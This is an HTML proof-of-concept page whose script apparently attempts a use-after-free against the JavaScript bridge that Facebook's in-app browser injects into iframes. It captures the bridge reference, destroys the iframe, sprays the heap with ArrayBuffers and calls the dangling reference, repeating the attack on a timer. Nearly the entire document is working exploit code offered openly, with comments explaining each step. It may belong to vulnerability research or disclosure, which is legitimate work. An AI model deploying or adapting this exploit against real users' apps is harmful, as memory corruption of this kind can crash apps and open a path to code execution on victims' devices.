<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>JSI Dangling Pointer</title>
</head>
<body style="background:#000; color:#f00; font-family:monospace;">
    <h3>Extracting and Firing Dangling Pointers...</h3>
    <div id="container"></div>

    <script>
        const container = document.getElementById('container');
        const uuid = "90dd8846-f47b-4312-8307-3681dc5bec88";
        
        function fireUAF() {
            // 1. Spawn an isolated IFrame
            let f = document.createElement('iframe');
            container.appendChild(f);
            
            // 2. Give Facebook's Java layer 400ms to inject the bridge into the new IFrame
            setTimeout(() => {
                let iwin = f.contentWindow;
                
                if (iwin && iwin.__call_iabjs_unified_bridge) {
                    // 3. Steal the native bridge reference before destruction
                    let stolenBridge = iwin.__call_iabjs_unified_bridge;
                    
                    // 4. Destroy the IFrame!
                    // This forces Chromium to delete the C++ RenderFrameHost.
                    f.remove();
                    
                    // 5. Thrash the memory heap.
                    // We allocate garbage to overwrite the exact memory space where 
                    // the C++ bridge object used to live.
                    let spray = [];
                    for(let i = 0; i < 5000; i++) spray.push(new ArrayBuffer(1024));
                    
                    // 6. The Execution (Use-After-Free)
                    // We call the stolen reference. If libhelium.so didn't invalidate
                    // this handle during the IFrame teardown, it jumps into our sprayed memory.
                    try {
                        stolenBridge("page_language", uuid, '{"message":{}}');
                    } catch(e) {}
                    
                } else {
                    // Clean up if it wasn't injected yet
                    f.remove();
                }
            }, 400); 
        }

        // Loop the attack to ensure we hit the exact garbage collection window
        setInterval(fireUAF, 600);
    </script>
</body>
</html>
